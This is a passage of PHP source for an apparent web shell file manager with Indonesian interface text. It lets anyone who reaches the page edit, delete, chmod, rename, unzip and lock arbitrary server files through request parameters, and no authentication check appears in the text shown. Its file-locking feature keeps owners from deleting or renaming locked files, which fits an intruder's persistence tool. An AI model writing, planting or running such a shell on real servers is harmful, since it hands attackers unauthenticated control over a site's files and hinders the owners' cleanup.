...
// ============================================================
// 🔒 SUPER STRONG FILE LOCKER - With Selective File Locking
// ============================================================
class SuperStrongFileLocker {
    private $filePath;
    private $lockFile;
    private $handle = null;
    private $pid;
    private $maxRetries = 20;
    private $retryDelay = 50000;
    ...
    public function acquireLock($timeout = 5) {
        $startTime = microtime(true);
        $attempts = 0;
        
        while ($attempts < $this->maxRetries) {
            if (file_exists($this->lockFile)) {
                $oldPid = @file_get_contents($this->lockFile);
                if (function_exists('posix_kill') && $oldPid !== false) {
                    if (@posix_kill((int)$oldPid, 0)) {
                        if ((microtime(true) - $startTime) > $timeout) {
                            throw new Exception("Timeout: File sedang digunakan oleh PID {$oldPid}");
                        }
            ...
            if (file_exists($this->lockFile)) {
                $currentPid = @file_get_contents($this->lockFile);
        ...
        throw new Exception("Tidak bisa mendapatkan lock setelah {$this->maxRetries} percobaan");
    }
    ...
    public function write($data) {
        if (!$this->handle || !$this->isLocked) {
            throw new Exception("File tidak dalam keadaan locked");
        }
    ...
    public function read() {
        ...
        @fseek($this->handle, 0);
        return @fread($this->handle, @filesize($this->filePath) ?: 1024);
    }
    
    public function isLocked() {
        return $this->isLocked || file_exists($this->lockFile);
    }
    ...
    public function safeRead($timeout = 5) {
        try {
            $this->acquireLock($timeout);
            $data = $this->read();
            $this->releaseLock();
...
function lockSpecificFile($filePath, $timeout = 5) {
    $locker = new SuperStrongFileLocker($filePath);
    return $locker->acquireLock($timeout);
}

function unlockSpecificFile($filePath) {
    $locker = new SuperStrongFileLocker($filePath);
    return $locker->releaseLock();
}

function lockFileWithCallback($filePath, $callback, $timeout = 5) {
    $locker = new SuperStrongFileLocker($filePath);
    try {
        $locker->acquireLock($timeout);
        $result = $callback($locker);
        $locker->releaseLock();
        return $result;
    } catch (Exception $e) {
        $locker->releaseLock();
...
// --- HANDLER FOR LOCK ACTIONS ---
if (isset($_GET['lock_action'])) {
    $target_file = isset($_GET['target_file']) ? $_GET['target_file'] : '';
    $action = $_GET['lock_action'];
    $current_dir = realpath(isset($_GET['path']) ? $_GET['path'] : getcwd());
    
    if ($action == 'lock') {
        try {
            $locker = new SuperStrongFileLocker($target_file);
            if ($locker->acquireLock(5)) {
                redirect_with_message('success', '🔒 File LOCKED: ' . basename($target_file), $current_dir);
            } else {
                redirect_with_message('error', 'Gagal lock file!', $current_dir);
            }
        } catch (Exception $e) {
            redirect_with_message('error', 'Gagal lock: ' . $e->getMessage(), $current_dir);
        }
    } elseif ($action == 'unlock') {
        $locker = new SuperStrongFileLocker($target_file);
        if ($locker->releaseLock()) {
            redirect_with_message('success', '🔓 File UNLOCKED: ' . basename($target_file), $current_dir);
        } else {
            redirect_with_message('error', 'Gagal unlock file!', $current_dir);
        }
    } elseif ($action == 'force_unlock') {
        if (forceUnlockFile($target_file)) {
            redirect_with_message('success', '⚠️ Force UNLOCKED: ' . basename($target_file), $current_dir);
        } else {
            redirect_with_message('error', 'Gagal force unlock!', $current_dir);
        }
    }
}

// --- BULK LOCK/UNLOCK ---
if (isset($_POST['bulk_lock_action'])) {
    $selected_files = isset($_POST['selected_files']) ? $_POST['selected_files'] : [];
    $action = $_POST['bulk_lock_action'];
    $current_dir = realpath(isset($_GET['path']) ? $_GET['path'] : getcwd());
    $success_count = 0;
    $fail_count = 0;
    $results = [];
    ...
    foreach ($selected_files as $file) {
        ...
        try {
            $locker = new SuperStrongFileLocker($file);
            if ($action == 'bulk_lock') {
                if ($locker->acquireLock(3)) {
                    $success_count++;
                    $results[] = "✅ " . basename($file) . " - LOCKED";
                } else {
                    $fail_count++;
                    $results[] = "❌ " . basename($file) . " - Gagal lock";
                }
            } elseif ($action == 'bulk_unlock') {
                if ($locker->releaseLock()) {
                    $success_count++;
                    $results[] = "✅ " . basename($file) . " - UNLOCKED";
                } else {
                    $fail_count++;
                    $results[] = "❌ " . basename($file) . " - Gagal unlock";
                }
            }
        } catch (Exception $e) {
            $fail_count++;
    ...
    $_SESSION['feature_output'] = implode("\n", $results) . "\n\n✅ Berhasil: $success_count | ❌ Gagal: $fail_count";
    redirect_with_message('success', "Bulk $action selesai! Berhasil: $success_count", $current_dir);
}
...
if(isset($_GET['option']) && isset($_POST['opt_action'])){ $target_full_path = $_POST['path_target']; $action = $_POST['opt_action']; $current_dir = realpath(isset($_GET['path']) ? $_GET['path'] : getcwd()); switch ($action) { 
    case 'delete': 
        // Cek lock sebelum delete
        if (isFileLocked($target_full_path)) {
            redirect_with_message('error', 'Tidak bisa delete: File sedang LOCKED!', $current_dir);
        }
        ...
        break; 
    case 'chmod_save': 
        if(chmod($target_full_path, octdec($_POST['perm_value']))) redirect_with_message('success', 'CHMOD SUCCESS !!', $current_dir); 
        else redirect_with_message('error', 'CHMOD Gagal !!', $current_dir); 
        break; 
    case 'rename_save': 
        $new_full_path = dirname($target_full_path).'/'.sanitizeFilename($_POST['new_name_value']); 
        // Cek lock sebelum rename
        if (isFileLocked($target_full_path)) {
            redirect_with_message('error', 'Tidak bisa rename: File sedang LOCKED!', $current_dir);
        }
        if(rename($target_full_path, $new_full_path)) redirect_with_message('success', 'RENAME SUCCESS !!', $current_dir); 
        else redirect_with_message('error', 'RENAME Gagal !!', $current_dir); 
        break; 
    case 'edit_save': 
        if(is_writable($target_full_path)) { 
            // Gunakan lock untuk edit
            try {
                $locker = new SuperStrongFileLocker($target_full_path);
                $locker->acquireLock(5);
                $result = file_put_contents($target_full_path, $_POST['src_content']);
                $locker->releaseLock();
                if($result !== false) redirect_with_message('success', 'EDIT SUCCESS !!', $current_dir);
                else redirect_with_message('error', 'Edit File Gagal !!', $current_dir);
            } catch (Exception $e) {
                redirect_with_message('error', 'Edit Gagal: ' . $e->getMessage(), $current_dir);
            }
        } else { 
    ...
    case 'extract_save': 
        if (class_exists('ZipArchive')) { 
            ...
            if ($zip->open($target_full_path) === TRUE) { 
                ...
                redirect_with_message('error', 'Gagal membuka file zip!', $current_dir); 
            } 
        } else { 
            redirect_with_message('error', 'Class ZipArchive tidak ditemukan!', $current_dir); 
        } 
        break; 
    } 
}
...
if ($show_file_list) {
    ...
    echo '<th>Name</th><th>Size</th><th>Perm</th><th>Status</th><th>Options</th></tr>';
    ...
    if ($scandir_items) {
        ...
        foreach($scandir_items as $item){
            ...
            // Cek status lock
            $isLocked = isFileLocked($full_item_path);
            $lockInfo = getLockInfo($full_item_path);
            ...
            if (is_file($full_item_path) && $item != '..') {
                if ($isLocked) {
                    echo "<span class='lock-badge locked'>🔒 LOCKED</span><br><small style='color:#888;'>PID: {$lockInfo['pid']}</small>";
                } else {
                    echo "<span class='lock-badge unlocked'>🔓 UNLOCKED</span>";
                }
            } else {
            ...
            // Kolom Options
            echo "<td class='td_home' style='text-align:center;'>";
            echo "<select style='width:120px;' onchange=\"if(this.value) window.location.href='?action='+this.value+'&target_file={$encoded_full_item_path}&path=".urlencode($path)."'\">";
            echo "<option value=''>Action</option>";
            
            // File actions
            if (is_file($full_item_path) && $item != '..') {
                echo "<option value='edit_form'>Edit</option>";
                if(class_exists('ZipArchive') && pathinfo($full_item_path, PATHINFO_EXTENSION) == 'zip') 
                    echo "<option value='extract_form'>Extract</option>";
                echo "<option value='delete'>Delete</option>";
                
                // Lock/Unlock actions
                if ($isLocked) {
                    echo "<option value='' disabled style='color:#FF0033;'>--- LOCKED ---</option>";
                    echo "<option value='' onclick=\"window.location.href='?lock_action=unlock&target_file={$encoded_full_item_path}&path=".urlencode($path)."'\">🔓 Unlock</option>";
                    echo "<option value='' onclick=\"if(confirm('Force unlock? Hanya jika proses mati!')) window.location.href='?lock_action=force_unlock&target_file={$encoded_full_item_path}&path=".urlencode($path)."'\">⚠️ Force Unlock</option>";
                } else {
                    echo "<option value='' onclick=\"window.location.href='?lock_action=lock&target_file={$encoded_full_item_path}&path=".urlencode($path)."'\">🔒 Lock</option>";
                }
            } else {
                echo "<option value='delete'>Delete</option>";
            }
            ...
            echo "<option value='chmod_form'>Chmod</option>";
            echo "</select>";
            echo "</td></tr>";
        }
    } else { echo "<tr><td colspan='6' style='text-align:center;'><font color='red'>Gagal membaca direktori.</font></td></tr>"; }
    
    // Bulk actions dengan lock
    if (class_exists('ZipArchive')) {
        echo '<tfoot><tr class="first"><td colspan="6">';
        echo 'With selected: ';
        echo '<select name="bulk_action">';
        echo '<option value="">Choose...</option>';
        echo '<option value="zip_selected">Zip</option>';
        echo '</select>';
        echo ' | Lock: ';
        echo '<select name="bulk_lock_action">';
        echo '<option value="">Choose...</option>';
        echo '<option value="bulk_lock">🔒 Lock All</option>';
        echo '<option value="bulk_unlock">🔓 Unlock All</option>';
        echo '</select>';
